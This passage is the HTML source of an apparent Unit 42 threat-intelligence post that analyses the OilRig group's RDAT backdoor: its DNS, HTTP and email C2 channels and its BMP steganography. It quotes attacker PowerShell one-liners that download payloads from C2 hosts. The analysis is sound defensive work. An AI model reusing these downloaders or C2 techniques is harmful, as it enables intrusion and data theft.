
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/icon-Unit42-180x180.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/icon-Unit42-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/icon-Unit42-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/oilrig-novel-c2-channel-steganography/" />

	<!-- This site is optimized with the Yoast SEO plugin v15.2.1 - https://yoast.com/wordpress/plugins/seo/ -->
	<title>OilRig Targets Middle Eastern Telecommunications Organization and Adds Novel C2 Channel with Steganography to Its Inventory</title>
	<meta name="description" content="We discovered a variant of an OilRig-associated tool that uses a novel email-based C2 channel with steganography to exfiltrate data." />
	<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
	<link rel="canonical" href="https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="OilRig Targets Middle Eastern Telecommunications Organization and Adds Novel C2 Channel with Steganography to Its Inventory" />
	<meta property="og:description" content="We discovered a variant of an OilRig-associated tool that uses a novel email-based C2 channel with steganography to exfiltrate data." />
	<meta property="og:url" content="https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/" />
	<meta property="og:site_name" content="Unit42" />
	<meta property="article:published_time" content="2020-07-22T13:00:40+00:00" />
	<meta property="article:modified_time" content="2020-07-22T18:11:16+00:00" />
	<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/07/Espionage-r3d2.png" />
	<meta property="og:image:width" content="4168" />
	<meta property="og:image:height" content="2084" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:label1" content="Written by">
	<meta name="twitter:data1" content="Robert Falcone">
	<meta name="twitter:label2" content="Est. reading time">
	<meta name="twitter:data2" content="21 minutes">
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://unit42.paloaltonetworks.com/#website","url":"https://unit42.paloaltonetworks.com/","name":"Unit42","description":"Palo Alto Networks","potentialAction":[{"@type":"SearchAction","target":"https://unit42.paloaltonetworks.com/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/#primaryimage","inLanguage":"en-US","url":"https://unit42.paloaltonetworks.com/wp-content/uploads/2020/07/Espionage-r3d2.png","width":4168,"height":2084,"caption":"A conceptual illustration showing a world map along with icons representing malware and other tools used by malicious actors"},{"@type":"WebPage","@id":"https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/#webpage","url":"https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/","name":"OilRig Targets Middle Eastern Telecommunications Organization and Adds Novel C2 Channel with Steganography to Its Inventory","isPartOf":{"@id":"https://unit42.paloaltonetworks.com/#website"},"primaryImageOfPage":{"@id":"https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/#primaryimage"},"datePublished":"2020-07-22T13:00:40+00:00","dateModified":"2020-07-22T18:11:16+00:00","author":{"@id":"https://unit42.paloaltonetworks.com/#/schema/person/9b513c1aa4fc24d8906475a0df1f2bda"},"description":"We discovered a variant of an OilRig-associated tool that uses a novel email-based C2 channel with steganography to exfiltrate data.","inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/"]}]},{"@type":"Person","@id":"https://unit42.paloaltonetworks.com/#/schema/person/9b513c1aa4fc24d8906475a0df1f2bda","name":"Robert Falcone","image":{"@type":"ImageObject","@id":"https://unit42.paloaltonetworks.com/#personlogo","inLanguage":"en-US","url":"https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg","caption":"Robert Falcone"}}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; OilRig Targets Middle Eastern Telecommunications Organization and Adds Novel C2 Channel with Steganography to Its Inventory Comments Feed" href="https://unit42.paloaltonetworks.com/oilrig-novel-c2-channel-steganography/feed/" />
<meta property="og:likes" content="16"/>
<meta property="og:readtime" content="18"/>
<meta property="og:views" content="30,189"/>
<meta property="og:date_created" content="July 22, 2020 at 6:00 AM"/>
<meta property="og:post_length" content="5238"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit-42/"/>
<meta property="og:author" content="Robert Falcone"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/robertfalcone/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:post_image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2020/07/Espionage-r3d2.png"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"OilRig Targets Middle Eastern Telecommunications Organization and Adds Novel C2 Channel with Steganography to Its Inventory","name":"OilRig Targets Middle Eastern Telecommunications Organization and Adds Novel C2 Channel with Steganography to Its Inventory","description":"We discovered a variant of an OilRig-associated tool that uses a novel email-based C2 channel with steganography to exfiltrate data.","url":"https:\/\/unit42.paloaltonetworks.com\/oilrig-novel-c2-channel-steganography\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/oilrig-novel-c2-channel-steganography\/","datePublished":"July 22, 2020","articleBody":"\r\nExecutive Summary\r\nWhile analyzing an attack against a Middle Eastern telecommunications organization, we discovered a variant of an OilRig-associated tool we call RDAT using a novel email-based command and control (C2) channel that relied on a technique known as steganography to hide commands and data within bitmap images attached to emails.\r\n\r\nIn May 2020, Symantec published research on the Greenbug group targeting telecommunications organizations in Southeast Asia, involving attacks made as recently as April 2020. We observed similar tactics and tools associated with attacks on a telecommunications organization in the Middle East in April 2020, specifically using custom Mimikatz tools, Bitvise, PowerShell downloaders and a custom backdoor we track as RDAT. Unit 42 has previously linked Greenbug to OilRig, a threat group we discovered in 2015. We had first seen the RDAT tool used in OilRig's operations back in 2017, but we later found a related sample created in 2018 that used a different command and control channel. When we analyzed this sample, we found a novel email-based C2 channel used in combination with steganography to exfiltrate data.\r\n\r\nWe have been tracking RDAT since 2017, when we first saw this tool uploaded to a webshell related to the TwoFace webshell discussed in our Striking Oil blog published on September 26, 2017. RDAT has been under active development since 2017, resulting in multiple variations of the tool that rely on both HTTP and DNS tunneling for C2 communications. In June 2018, the developer of RDAT added the ability to use Exchange Web Services (EWS) to send and receive emails for C2 communications. This email-based C2 channel is novel in its design, as it relies on steganography to hide commands and exfiltrates data within BMP images attached to the emails. The combination of using emails with steganographic images to carry the data across the C2 can result in this activity being much more difficult to detect and allow for higher chances of defense evasion.\r\n\r\nPalo Alto Networks customers are protected by WildFire and Cortex XDR, which identifies all RDAT samples as malicious, as well as DNS Security and URL Filtering, which identifies and blocks the C2 activity.\r\nAttack Details\r\nWe first discovered the existence of RDAT on October 7, 2017, when we observed it being uploaded to a webshell 11 days after we had published our research exposing webshell activity by this adversary. We believe the group attempted to use the RDAT payload for continued access to the server once the use of the webshell was exposed.\r\n\r\nIn April 2020, we observed activity involving the potential breach of a telecommunications organization in the Middle East. The files associated with this activity included custom Mimikatz samples for dumping credentials, a sample of the Bitvise client we believe was used to create SSH tunnels, and a custom backdoor called RDAT. From the initial RDAT sample we collected, we were able to expand the sample set and relate previously seen ISMDOOR samples as well. Given the combination of the use of RDAT in OilRig-related webshells, code similarities and tactical similarities, we are confident RDAT is a tool deployed by OilRig.\r\n\r\nTwo of the related tools collected had PDB paths similar to ones we had seen in the past. The PDB paths were C:\\Users\\Void\\Desktop\\dns\\client\\x64\\Release\\client.pdb and C:\\Users\\Void\\Desktop\\RDAT\\client\\x64\\Release\\client.pdb, the latter of which is the basis of the tool name. Using the file path of the user in the PDB string of C:\\Users\\Void\\Desktop as shown in Figure 1, we gathered over a dozen samples with that file path, with most of the samples identified as a known OilRig tool called ISMDOOR. Considering the small cluster of related tools, it is highly likely these have been developed by a single adversary or adversary group with control over the codebase.\r\n\r\n\r\nFigure 1. Pivots from PDB strings\r\nWe also observed PowerShell downloaders attempting to retrieve files from the domain digi.shanx[.]icu.\r\n\r\n\r\nFigure 2. PowerShell and infrastructure overlaps\r\nIn Symantec\u2019s Greenbug report, once the adversary gained interactive access to target hosts, they were observed executing PowerShell commands to perform post-exploitation activities. In one instance, a Powershell script was executed to retrieve RDAT from the C2 apps.vvvnews[.]com, save it to C:\\Programdata\\Nt.dat, and move it to C:\\Programdata\\Vmware\\VMware.exe as seen in the following snippet:\r\n\r\n(New-Object System.Net.WebClient).DownloadFile('http:\/\/apps[.]vvvnews .com:8080\/Yf.dat', 'C:\\Programdata\\Nt.dat');\r\n\r\nmove C:\\Programdata\\Nt.dat C:\\Programdata\\Vmware\\VMware.exe -force;\r\n\r\nDuring our research, we collected a very similar PowerShell script using a different C2 and with some variations in commands, but with the same file path of C:\\Programdata\\Nt.dat:\r\n\r\n$WebClient = New-Object System.Net.WebClient; $WebProxy = New-Object System.Net.WebProxy('http:\/\/192.168.3.4:8080',$true); $WebClient.Proxy = $WebProxy;Try {$WebClient.DownloadFile('http:\/\/digi.shanx[.]icu:8080\/Nt.dat','C:\\Programdata\\Nt.dat')} Catch {$_.Exception.Message | out-file C:\\Programdata\\Exceptions.dat};\r\n\r\nUnfortunately, we could not verify the contents of Nt.dat due to the C2 server http:\/\/digi.shanx[.]icu:8080 being unavailable at the time of analysis.\r\nRDAT Backdoor\r\nThe adversaries compiled the RDAT payloads used in the attacks on the Middle Eastern telecommunications organization on March 1, 2020, and configured it to use a domain provided on the command line or the hardcoded domain rsshay[.]com as its C2 server. Unlike previous RDAT samples, this particular sample only uses DNS tunneling for its C2 communications with no HTTP fallback channel. This RDAT sample can only use TXT queries in its DNS tunnel and will issue queries structured like the following:\r\n\r\n&lt;encoded data&gt;.&lt;encoding method, 0 for base64 or 1 for base32&gt;&lt;encryption key&gt;.&lt;C2 domain&gt;\r\n\r\nThe encoded data portion of the subdomain is encoded base32 if the actor includes a command line argument 1 \u2013 otherwise, it uses base64. The payload also substitutes characters within the base64 encoded subdomain to avoid including characters that are not allowed in domain names, such as = with -, \/ with _ and + with -a. For example, we observed the following beacon during our testing:\r\n\r\n91mzXgXT-a9sLktr-aOz8pAw--.0R2.rsshay[.]com\r\n\r\nThe encoded data in the beacon (subdomain) is ciphertext generated using AES and a 16-byte key generated by concatenating two randomly chosen alphanumeric characters that are also present in the subdomain immediately before the C2 domain. For instance, if the two random alphanumeric characters included in the subdomain were R2, the payload would use the string R2R2R2R2R2R2R2R2 as a key to encrypt the data. The example beacon above would decrypt to 1,6,1.0_Y,2619, which is structured as follows:\r\n\r\n&lt;communications type value&gt;,&lt;ID value from config&gt;,&lt;hardcoded payload version&gt;,&lt;randomly generated number&gt;\r\n\r\nThe payload decodes the response for an answer to the TXT query with base64 and decrypts using the same AES cipher and key as the request. The payload attempts to parse the decrypted cleartext using the regular expression \u201c[^,]+\u201d to get the command value and the command arguments that are split with a comma. The payload then checks the command value using a command handler that has the ability to execute commands and upload and download files, as seen in Table 1.\r\n\r\n\r\n\r\nCommand\r\nDescription\r\n\r\n\r\n0\r\nIdle.\r\n\r\n\r\n1\r\nRun specified command. Creates write and read pipes to issue the command and read the output and sends the results to the C2 over the DNS tunnel.\r\n\r\n\r\n2\r\nUploads a file to the C2 by reading in a specified file and sending its contents over the DNS tunnel in chunks.\r\n\r\n\r\n3\r\nDownloads a file via the DNS tunnel.\r\n\r\n\r\n\r\nTable 1. Commands available in RDAT\r\n\r\nRelated RDAT\r\nDuring our research, we gathered several additional samples by pivoting on the contents of the executables and other various attributes. Table 2 shows when these samples were compiled, their respective C2 server and the service name they use when the actor installs them on the compromised system. As shown by the compilation times, this tool has been in development since 2017, with the most recent sample we collected being compiled in April 2020. The sample compiled in August 2017 was uploaded to a webshell related to TwoFace, while the samples compiled in March 2020 were used in the attack on the Middle Eastern telecommunications organization. The RDAT sample compiled in April 2020 was also delivered to the same telecommunications organization, which was configured to use new infrastructure (sharjatv[.]com, wwmal[.]com) and supported both DNS A and AAAA records for its DNS tunneling C2 channel.\r\n\r\nThe most interesting sample we discovered was compiled on July 24, 2018. This sample included a novel C2 channel that used the Exchange Web Services (EWS) API to send and receive emails containing steganographic images as attachments. This novel C2 channel supplemented the HTTP and DNS tunneling C2 channels seen in other RDAT samples, all of which we will discuss in detail in the upcoming sections.\r\n\r\n\r\n\r\nSHA256\r\nCompiled\r\nC2\r\nService Name\r\n\r\n\r\n7395a3ada245..\r\n2017-08-07\r\nProvided as argument\r\nService\r\n\r\n\r\n8f943bc5b205..\r\n2018-03-13\r\nProvided as argument\r\nMy Sample Service\r\n\r\n\r\n8120849fbe85..\r\n2018-07-24\r\nallsecpackupdater[.]com\r\n\r\ntacsent[.]com\r\n\r\nkoko@acrlee[.]com\r\n\r\nh76y@acrlee[.]com\r\nN\/A\r\n\r\n\r\nbcdb63b3520e..\r\n2018-08-27\r\nProvided as argument\r\nN\/A\r\n\r\n\r\nf42c2b40574d..\r\n2018-09-09\r\nProvided as argument\r\nMy Sample Service\r\n\r\n\r\nfcabb86331cd..\r\n2018-09-09\r\nProvided as argument\r\nMy Sample Service\r\n\r\n\r\n7b5042d3f0e9..\r\n2019-09-17\r\nProvided as argument\r\nWindows Video Service\r\n\r\n\r\nee32bde60d11..\r\n2019-11-04\r\nProvided as argument\r\nN\/A\r\n\r\n\r\nde3f1cc2d4aa..\r\n2019-11-11\r\nProvided as argument\r\nMy Sample Service\r\n\r\n\r\n4ea6da6b35c4..\r\n2020-03-01\r\nrsshay[.]com\r\nWindows Video Service\r\n\r\n\r\nacb50b02ab0c..\r\n2020-03-01\r\nrdmsi[.]com\r\nWindows Video Service\r\n\r\n\r\n55282007716b..\r\n2020-03-01\r\nrdmsi[.]com\r\nWindows Video Service\r\n\r\n\r\nba380e589261..\r\n2020-03-01\r\nrsshay[.]com\r\nWindows Video Service\r\n\r\n\r\n6322cacf839b..\r\n2020-04-04\r\nsharjatv[.]com\r\nwwmal[.]com\r\nMy Sample Service\r\n\r\n\r\n\r\nTable 2. Related RDAT samples \r\n\r\nNovel C2 Using Exchange Web Services and Steganography\r\nThe novel C2 channel in the RDAT sample uses email for a C2 channel by interacting with the local Exchange server with the EWS API. There are two hardcoded actor-controlled email addresses: koko@acrlee[.]com and h76y@acrlee[.]com. These two email addresses are used by the RDAT payload to send and receive emails to facilitate C2. To send emails from the compromised host, the payload uses the email associated with the account logged into the compromised host, as it uses the WinHTTP library to make requests to the API with the \"WINHTTP_OPTION_AUTOLOGON_POLICY\" field set to 'WINHTTP_AUTOLOGON_SECURITY_LEVEL_LOW', which automatically attempts to log onto Exchange using the default credentials.\r\n\r\nThe actor communicates with the payload by sending emails from one of two email addresses to the email address of the compromised account. To receive emails from the actor, the payload will:\r\n\r\n \tInitially create an inbox rule to move actor\u2019s emails to the junk folder.\r\n \tContinually look in the junk folder for actor-sent emails that have attachments.\r\n \tProcess attachments for inbound commands hidden within BMP images.\r\n\r\nTo communicate with the actor, the payload sends emails from the account logged into the compromised system and performs the following actions:\r\n\r\n \tCreates a draft email with the actor-controlled email address in the \u201cTo\u201d field.\r\n \tAttaches a BMP image with a hidden message or data to exfiltrate to the draft.\r\n \tSends the draft to the actor\u2019s email address.\r\n\r\nTo show this channel, we analyzed the outbound HTTP POST requests to the EWS API and took screenshots of the requests. The POST requests all have an anomalous \u201cUser-Agent\u201d of \u201cfirefox\u201d and use Simple Object Access Protocol (SOAP) messages to interact with the Exchange server. The first request has a SOAP message to create an inbox rule named \"ExchangeRule\" that moves all inbound emails from the C2 email addresses to the \"junkemail\" folder. Figure 3 shows the HTTP POST request containing the SOAP message that creates this inbox rule. The rule name is highlighted in the red box, the condition that includes the actor\u2019s email address in the blue box and the action to move it to the junk folder in the green box.\r\n\r\n\r\nFigure 3. HTTP POST request creating the inbox rule to move emails from actor to the junk folder\r\nThe payload will then continually look for new emails from the actor in the junk folder. The payload will issue a request to the EWS API to check for unread emails from the actor\u2019s email addresses with an attachment. Figure 4 shows the HTTP POST the payload issues to check for inbound emails from the actor, with the actor\u2019s email address in the red box, the check for an attachment in the blue box and the junk folder specified in the green box.\r\n\r\n\r\nFigure 4. HTTP POST request sent to the Exchange server looking for inbound emails from actor\r\nIf the payload obtains an email sent by the actor, the payload will process the response to the SOAP request and send additional requests to the EWS API to get the email, the attachment and the contents of the attachment. The payload processes the responses to these requests using regular expressions to find specified values within the XML. The payload uses the regular expressions to find the following values within the server\u2019s response:\r\n\r\n \tId and ChangeKey to get the specified email.\r\n \tAttachmentId Id to get the attachment from the email.\r\n \t&lt;t:Content&gt; and &lt;\/t:Content&gt; to get the contents of the attachment.\r\n\r\nIt then saves this content to a file in the %TEMP% folder with a \".bmp\" file extension. It then issues a SOAP request to delete the processed email. This completes the process in which the payload receives inbound communications from the actor.\r\n\r\nTo send its beacon and exfiltrate data to the actor, the payload will interact with the EWS API to perform the following three steps:\r\n\r\n \tSave a draft email with the actor\u2019s email address in the \u201cTo\u201d field.\r\n \tAttach the BMP image containing the hidden data to the saved draft email.\r\n \tSend the saved draft email.\r\n\r\nFigure 5 shows the draft email with the BMP image attached immediately prior to being sent. The figure shows the actor\u2019s email address in the \u201cTo\u201d field, the BMP image with hidden data as the attachment, and subjects and message bodies containing strings of an unknown purpose.\r\n\r\n\r\nFigure 5. Screenshot of Outlook Web App showing the email draft created by the payload prior to it being sent to the actor\r\nTo carry out this functionality, the payload creates an email and saves it as a draft. This allows it to attach the image containing the hidden data prior to sending the email. Figure 6 shows the SOAP request to the EWS API, specifying that the server should save the email to the drafts folder in the red and blue boxes and the actor\u2019s email address in the green box.\r\n\r\n\r\nFigure 6. HTTP POST request creating the email draft prior to attaching the image\r\nWith the email saved in the drafts folder, the payload will then attach the BMP image to the email using an HTTP POST request to the EWS API. Figure 7 shows the request to the EWS API that includes the filename of the attachment in the red box and the base64 content of the attachment in the blue box.\r\n\r\n\r\nFigure 7. HTTP POST request attaching the image to the email draft\r\nThe payload issues one last request to the EWS API to send the email draft with the attached BMP image to the actor. Figure 8 shows the HTTP POST request issued by the payload to send the email with the SendItem action highlighted in the red box.\r\n\r\n\r\nFigure 8. HTTP POST request sending the email draft to the actor\u2019s email address\r\n\r\nHiding Data with Steganography\r\nThe payload will receive data from and exfiltrate data to the C2 within email attachments, specifically within the BMP images that use steganography to hide the data within the image. The method with which the payload extracts data from the BMP image to receive data from the C2 is the same as its method for hiding data to exfiltrate. While we did not observe the C2 using this method to send commands, we were able to analyze the payload to determine how it would send messages and exfiltrate data from the system.\r\n\r\nTo send data using this C2 channel, the payload will read the following image available on a default install of Windows:\r\n\r\nC:\\ProgramData\\Microsoft\\User Account Pictures\\guest.bmp\r\n\r\nDepending on the version of Windows, the \u201cguest.bmp\u201d image differs in size and contents.The image from Windows 7 is 128x128 pixels and contains an image of a suitcase, while the Windows 10 image is 448x448 pixels and contains a generic user icon. Figure 9 shows the two images extracted from default installations of Windows 7 and 10 with the latter scaled down in size.\r\n\r\n\r\nFigure 9. The \u201cguest.bmp\u201d image from Windows 7 on the left and Windows 10 on the right\r\nThe payload determines the height, width and color depth of the image and calculates how many images it will need to modify to send the entirety of the data:\r\n\r\n(length of data)\/(width*(height-1))\r\n\r\nIt uses the modulo operator to check if there is data that does not fit in the previous image and will add one to the required image count if leftover data exists. The payload then iterates through the data by grabbing a substring of the data that will fit within the image.\r\n\r\nTo explain how the payload hides data within this image, we must first briefly explain the BMP file format. The BMP file format includes file headers and an array of values used to store the red, green and blue color values of each pixel in the image. The format of each color value in the array of color values varies depending on the color depth, as 24-bit BMP images will use 3-byte values that are used to specify the intensities of red, blue and green colors for each pixel in the image, while 32-bit images use 4-byte values. The RDAT payload can support both 24- and 32-bit images. Since both \u201cguest.bmp\u201d images from Windows 7 and 10 are 24-bit images, we observed the payload using the 3-byte color values for each pixel to hide data. The payload will modify each pixel\u2019s 3-bytes to transmit one byte of exfiltrated data. By spreading the data byte over the 3-bytes for each pixel, the impact on the original image is minor and difficult to visualize. Figure 10 compares the original image from Windows 7 and the modified image carrying the hidden data.\r\n\r\n\r\nFigure 10. Original \u201cguest.bmp\u201d image from Windows 7 on the left and the modified carrier image on the right\r\nFigure 10 shows how difficult it is to see the hidden data embedded within the BMP image. We zoomed in on the 29 pixels modified to carry the data to visualize the differences and found that they differed slightly in color, as seen in the comparison in Figure 11. All the pixels in the two images are different. However, some of the differences in color are more obvious than others.\r\n\r\n\r\n\r\n\r\nFigure 11. This zoomed-in view shows the original pixels on top and pixels carrying 29-bytes of data on the bottom\r\nTo hide the data within the image, the payload will check the color depth of the \u201cguest.bmp\u201d image for either 24- or 32-bit depth, which allows the payload to determine how many bytes per pixel it will need to spread the bits of the hidden data across. For instance, a 24-bit BMP image like \"guest.bmp\" from Windows 7, seen in Figure 10 above, will have three bytes per pixel in the image that represents the red, green and blue values for that pixel. Using this 24-bit image, the payload will spread the 8-bits of the data byte across these three bytes, specifically by setting the least significant bit values in the pixel bytes to the bit values of the data byte.\r\n\r\nLet's use the example data 8,54351-1616479009,0 from a beacon sent from the payload to the C2, which it will encode using base64 to OCw1NDM1MS0xNjE2NDc5MDA5LDA=, append the @ symbol and embed within a BMP image. The O ASCII character has a hexadecimal value of 0x4f, which is 01001111 in base2. The 8-bits of this base2 representation are then used to set specific bits within the 3-bytes for each pixel:\r\n\r\n \tData bits 0 and 1 replacing the first pixel byte's bits 1 and 0.\r\n \tData bits 2, 3 and 4 replacing the second pixel byte\u2019s bits 2, 1 and 0.\r\n \tData bits 5, 6 and 7 replacing the third pixel byte's bits 2, 1 and 0.\r\n\r\nUsing this logic, the payload will read the pixel bytes from the \u201cguest.bmp\u201d image, which is 0xe4, 0xdf and 0xb9 and replace the following bits using the base2 of 010 011 11 for O:\r\n\r\n \tReplace bits 2, 1 and 0 within 0xe4\u00a0with 010, which results in 0xe2.\r\n \tReplace bits 2, 1 and 0 within 0xdf with 110, which results in 0xde.\r\n \tReplace bits 1 and 0 within 0xb9 with 11, which results in 0xbb.\r\n\r\nFigure 12 below shows how these bit replacements occur and how the replacements ultimately change the values of the pixel's bytes.\r\n\r\n\r\nFigure 12. Visual explanation of the bit replacement performed on each pixel to hide data in the BMP images\r\n\r\nHTTP and DNS Tunneling C2 Channels\r\nThe RDAT sample with the novel EWS C2 channel also had HTTP and DNS tunneling as C2 channels as well, which are very similar to other RDAT samples we collected. The HTTP C2 channel uses HTTP POST requests to transmit data to the C2 server. The code contains the following two domains:\r\n\r\nallsecpackupdater[.]com\r\n\r\ntacsent[.]com\r\n\r\nIt should be noted that the code only attempts to use the tacsent[.]com domain for its HTTP C2 channel. We are unsure why the code contains the allsecpackupdater[.]com domain as it does not attempt to communicate with it, but it is possible that it is an artifact from a previous version of the tool. This domain was previously tied to the OilRig threat group, as ClearSky discovered this domain in 2017 and noted its relation to Greenbug\u2019s ISMDOOR tool.\r\n\r\nThe HTTP POST requests have a custom \"From:\" field in the header that has a unique identifier assigned to the infected system. The HTTP POST request will contain a \"v\" parameter and a random number in the URL and a user-agent of \"chrome.\" Figure 13 shows an example of an HTTP POST issued by the payload as its initial beacon to the C2, which shows the anomalous user-agent \u201cchrome\u201d and custom \u201cFrom\u201d field.\r\n\r\n\r\nFigure 13. Initial beacon sent by RDAT sample over its HTTP C2 channel\r\nThe payload encrypts the data sent in the POST request using the AES cipher, specifically in CBC mode. To decrypt this data, the data itself is first converted from the URL-safe hexadecimal percent encoded characters to their \/, + and = character equivalent. After this conversion, the resulting data is decoded using base64 and then decrypted using AES and the value in the From field as a key and initialization vector (IV). For instance, using the From value for the key and IV to decrypt the POST data with the AES cipher produces the following cleartext:\r\n\r\n1,1543511637567325,12031\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08\r\n\r\nThe payload will check the C2 server's response to this HTTP POST for a , using a regular expression [^,]+ to determine if the C2 provided a command. The payload can only exfiltrate 102,400 bytes of data at a time, which it uses a field in the exfiltrated response to notify the C2 of the offset of the data so the C2 can reconstruct it.\r\n\r\nThe DNS tunneling protocol is very similar to the protocol discussed earlier in this blog, as it uses the second level subdomain for its AES key but uses four characters instead of two. It also uses the same character replacement of = with -, \/ with _ and + with -a to remove characters that are not allowed in domain names, as did the RDAT sample used in the attacks on the Middle Eastern telecommunications organization. The DNS tunnel for this sample used DNS A record queries and the same domain as the HTTP C2 channel, which generates an initial beacon that will resemble the following:\r\n\r\nP9rktZsukI5RVAdZWSR-a6uVYKeQJ-azhVLzUUfGs1TDQ-.fN26.tacsent[.]com\r\n\r\nTo decrypt this beacon, the C2 uses the second level subdomain to create an AES key and IV of fN26fN26fN26fN26, which is the second-level domain used four times to create a 16-byte string. The resulting cleartext would contain the following message, which is a comma-separated string that includes communication type and a unique system identifier:\r\n\r\n3,1543511637567325,0\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\r\n\r\nTo exfiltrate data using this DNS tunneling protocol, the payload will add additional subdomains to query, specifically a field for the data sequence number and a field for the exfiltrated data. For instance, the following DNS query sends system information to the C2:\r\n\r\n1.44gkxXizTF3QJU0F2AllV_0qhr1xcYmy8GeMB6nnGNSw0bls7JpP0zIqvnyO.xEZlrurmSHgf\r\n\r\nuoAcqi9blguWDzwH9oQCWZ-aTeBSBE2M-.tJ8z.tacsent[.]com\r\n\r\nThe fifth-level subdomain is a data sequence number that allows the C2 server to reassemble the data, which will start with 1 and increment by 60 as the DNS tunneling protocol sends 60-bytes of encoded ciphertext within each DNS request. The fourth-level subdomain contains the 60-bytes of encoded ciphertext that RDAT sends to the C2, while the third- and second-level subdomains are the same as the beacon. In the above example, the AES key and IV would be tJ8ztJ8ztJ8ztJ8z, which would decrypt the third-level subdomain to the following cleartext:\r\n\r\n2,1543511637567325,0\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\r\n\r\nUsing the same AES key and IV, the cleartext in the fourth-level subdomain includes the system information, which in the above example would produce:\r\n\r\n1:|2:MicrosoftWindows7Professionw\\x01\r\n\r\nRegardless of the C2 channel used, the RDAT sample parses responses using a command handler to determine the course of action to take. Table 3 shows the commands available within the command handler, as well as the structure of the response message the payload would send to the C2. The command handler in this RDAT sample has more capabilities compared to the three commands available in the sample seen in the attacks on the Middle Eastern telecommunications organization.\r\n\r\n\r\n\r\nCommand Structure\r\nResponse structure\r\nDescription\r\n\r\n\r\n0,\r\n\r\nIdle.\r\n\r\n\r\n1,&lt;task number&gt;,&lt;base64 encoded command to execute&gt;\r\n2,&lt;16-char system identifier&gt;,&lt;task number&gt;,&lt;base64 encoded results&gt;,&lt;offset in data&gt;,&lt;total data length&gt;\r\nExecutes command using \"cmd.exe \/c\"\r\n\r\n\r\n2,&lt;task number&gt;,&lt;cleartext filename&gt;\r\n3,&lt;16-char system identifier&gt;,&lt;task number&gt;,&lt;base64 encoded file contents&gt;,&lt;offset in data&gt;,&lt;total data length&gt;\r\nUploads a specified file from the system.\r\n\r\n\r\n3,&lt;task number&gt;,&lt;filename&gt;,&lt;file size&gt;\r\n4,&lt;16-char system identifier&gt;,&lt;task number&gt;,&lt;offset in data&gt;,&lt;random number&gt;\r\nDownloads a file from the C2 response to a temporary file named %TEMP%\\tmp&lt;random number&gt;. Downloads 81,920 bytes at a time by sending HTTP POST requests with a communications type of \"4\" with the offset in the data it wishes to receive and parsing the response for data it will write to the file. Payload then opens the file, base64 decodes and decrypts its contents with AES CBC. Sends \"-1\" as the offset to C2 to notify the C2 that it decoded\/decrypted the temporary file and wrote it to the specified file.\r\n\r\n\r\n5,&lt;task number&gt;\r\n6,&lt;16-char system identifier&gt;,&lt;task number&gt;,&lt;base64 encoded screenshot&gt;,&lt;unk, size?&gt;\r\nTakes a screenshot, encodes it as a JPEG, base64 encodes the JPEG image.\r\n\r\n\r\n6,&lt;task number&gt;\r\n7,&lt;16-char system identifier&gt;,&lt;task number&gt;,\"&lt;EOF&gt;\"\r\nKills the payload's process and reruns it using the \"-r\" command line switch by running the following on the command line: taskkill \/f \/pid &lt;current PID&gt; &amp;&amp; &lt;current executable path&gt;\r\n\r\n\r\n7,&lt;task number&gt;\r\n7,&lt;16-char system identifier&gt;,&lt;task number&gt;,\"&lt;EOF&gt;\"\r\nUninstalls the payload by running the following on the command line: taskkill \/f \/pid &lt;current PID&gt; &amp;&amp; del \/f &lt;current executable path&gt;\r\n\r\n\r\n\r\nTable 3. Commands available within the RDAT sample that used the novel EWS C2 channel\r\n\r\nConclusion\r\nThe RDAT backdoor has been used by the OilRig threat group for at least three years to target organizations in the Middle East, with the most recent known activity occurring in April 